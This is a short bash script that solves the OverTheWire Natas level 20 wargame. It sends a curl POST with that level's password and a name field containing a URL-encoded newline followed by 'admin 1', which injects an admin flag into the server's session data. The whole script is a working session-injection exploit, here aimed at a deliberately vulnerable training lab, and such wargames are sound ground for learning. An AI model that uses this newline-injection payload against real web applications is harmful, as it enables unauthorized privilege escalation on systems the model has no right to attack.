#!/usr/bin/env bash
curl -vv http://natas20.natas.labs.overthewire.org?debug \
    -u natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF \
    -c cookies.txt \
    -X POST \
    -d name="%0Aadmin%201" \
    #-H "Content-Type: application/x-www-form-urlencoded" \
    #-b PHPSESSID=åäö \

